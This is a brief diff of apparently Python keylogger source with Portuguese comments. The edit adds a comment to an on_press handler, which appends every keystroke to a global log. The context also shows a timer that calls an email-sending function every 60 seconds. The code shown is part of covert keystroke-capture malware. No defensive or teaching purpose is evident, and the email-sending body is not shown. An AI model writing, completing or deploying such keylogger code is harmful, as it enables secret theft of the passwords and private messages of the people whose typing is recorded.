@@ -30,7 +30,7 @@ def enviar_email():
 
     Timer(60, enviar_email).start()  # Executa novamente após 60 segundos 
 
-def on_press(key):
+def on_press(key): # Esta função é chamada toda vez que o usuário pressiona uma tecla
     global log
     try:
         log += key.char
